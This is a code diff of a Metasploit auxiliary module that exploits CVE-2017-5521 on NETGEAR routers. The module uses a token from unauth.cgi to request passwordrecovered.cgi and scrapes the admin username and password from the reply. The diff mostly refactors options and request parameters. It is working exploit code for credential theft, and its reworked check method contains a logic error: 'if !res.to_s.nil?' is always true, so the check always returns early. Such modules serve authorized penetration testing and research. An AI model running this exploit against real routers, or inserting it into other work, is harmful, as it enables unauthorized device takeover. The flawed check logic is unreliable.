@@ -17,8 +17,9 @@ class MetasploitModule < Msf::Auxiliary
         The exploit will not complete if password recovery is set on the router.
         The password is recieved by passing the token generated from `unauth.cgi`
         to `passwordrecovered.cgi`. This exploit works on many different NETGEAR
-        products. The full list of affected productsis available here:
-        http://pastebin.com/dB4bTgxz
+        products. The full list of affected products is available in the 'References'
+        section.
+
       },
       'Author'         =>
         [
@@ -31,6 +32,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911' ],
           [ 'URL', 'http://thehackernews.com/2017/01/Netgear-router-password-hacking.html'],
           [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2017-5521--Bypassing-Authentication-on-NETGEAR-Routers/'],
+          [ 'URL' , 'http://pastebin.com/dB4bTgxz'],
           [ 'EDB', '41205']
         ],
       'License'        => MSF_LICENSE
@@ -38,8 +40,6 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
     [
-      OptPort::new('RPORT', [true, 'The port to connect to RHOST with', 80]),
-      OptString::new('RHOST', [true, 'The router target ip address', nil]),
       OptString::new('TARGETURI', [true, 'The base path to the vulnerable application', '/'])
     ], self.class)
   end
@@ -50,7 +50,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    rhost = datastore['RHOST']
     uri = target_uri.path
     uri = normalize_uri(uri)
     print_status("Checking if #{rhost} is a NETGEAR router")
@@ -69,15 +68,20 @@ class MetasploitModule < Msf::Auxiliary
       marker_one = "id="
       marker_two = "\""
       token = scrape(res.to_s, marker_one, marker_two)
+
       if token.nil?
         print_error("#{rhost} is not vulnerable: Token not found")
         return
       end
+
       print_status("Token found: #{token}")
       vprint_status("Token found at #{rhost}/unauth.cgi?id=#{token}")
+
       r = send_request_cgi({
         'uri' => "/passwordrecovered.cgi",
-        'vars_get' => "id=#{token}"})
+        'vars_get' => { 'id'  =>  token }
+        })
+
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
       if r.to_s.include?('left">')
         username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td><td class=\"MNUText\" align=\"left\">", "</td>")
@@ -98,19 +102,20 @@ class MetasploitModule < Msf::Auxiliary
 
   #Almost every NETGEAR router sends a 'WWW-Authenticate' header in the response
   #This checks the response dor that header.
-  def check                             #NOTE: this is working
+  def check
+
     res = send_request_cgi({'uri'=>'/'})
-    unless res
+    if res.nil?
       fail_with(Failure::Unreachable, 'Connection timed out.')
     end
 
-    if res.nil?
-      print_erro("#{rhost} returned an empty response")
+    if !res.to_s.nil?
+      print_error("#{rhost} returned an empty response")
       return
     else
-      data = res.to_s
       # Checks for the `WWW-Authenticate` header in the response
-      if data.include? "WWW-Authenticate"
+      if res.headers["WWW-Authenticate"]
+        data = res.to_s
         marker_one = "Basic realm=\""
         marker_two = "\""
         model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
